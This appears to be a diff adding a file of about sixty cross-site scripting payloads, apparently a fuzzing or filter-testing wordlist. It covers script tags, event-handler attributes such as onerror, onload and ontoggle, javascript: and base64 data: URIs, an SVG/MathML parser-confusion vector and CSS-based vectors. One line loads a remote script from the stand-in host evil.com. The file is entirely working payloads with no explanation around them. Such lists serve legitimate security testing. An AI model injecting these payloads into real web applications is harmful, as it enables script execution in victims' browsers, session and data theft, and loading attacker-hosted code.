@@ -1,0 +1,63 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>document.write('XSS')</script>
+<script>console.log('XSS')</script>
+<script>eval('alert(1)')</script>
+<script src=http://evil.com/xss.js></script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=prompt(1)>
+<img src=1 onerror=alert(1)>
+<img src="x" onerror="alert(1)">
+<img src='x' onerror='alert(1)'>
+<img src=x onload=alert(1)>
+<img src=x onmouseover=alert(1)>
+<body onload=alert(1)>
+<body onload=alert('XSS')>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<svg onload=alert(1)>
+<svg onload=alert('XSS')>
+<svg><script>alert(1)</script></svg>
+<svg/onload=alert(1)>
+<marquee onstart=alert(1)>
+<marquee onstart=alert('XSS')>
+<marquee behavior=alternate onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<details open ontoggle=alert('XSS')>
+<select onfocus=alert(1) autofocus>
+<select onfocus=alert('XSS') autofocus>
+<input onfocus=alert(1) autofocus>
+<input onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert(1) autofocus>
+<audio src=x onerror=alert(1)>
+<video src=x onerror=alert(1)>
+<video><source onerror=alert(1)>
+<iframe src=javascript:alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+<a href=javascript:alert(1)>click</a>
+<a href="javascript:alert(1)">click</a>
+<a href='javascript:alert(1)'>click</a>
+<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>click</a>
+<form action=javascript:alert(1)><input type=submit>
+<button onclick=alert(1)>click</button>
+<button onfocus=alert(1) autofocus>click</button>
+<div onmouseover=alert(1)>hover</div>
+<span onmouseover=alert(1)>hover</span>
+<p onmouseover=alert(1)>hover</p>
+<table background=javascript:alert(1)>
+<table><td background=javascript:alert(1)>
+<bgsound src=javascript:alert(1)>
+<isindex type=image src=1 onerror=alert(1)>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<applet code=javascript:alert(1)>
+<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)></mglyph></table></mtext></math>
+<style>@import 'javascript:alert(1)';</style>
+<style>*{background-image:url(javascript:alert(1))}</style>
+<link rel=stylesheet href=javascript:alert(1)>
+<meta http-equiv=refresh content="0;url=javascript:alert(1)">
+<xss style=animation-name:rotation onanimationstart=alert(1)>
+<xss style=behavior:url(xss.htc) onbegin=alert(1)>
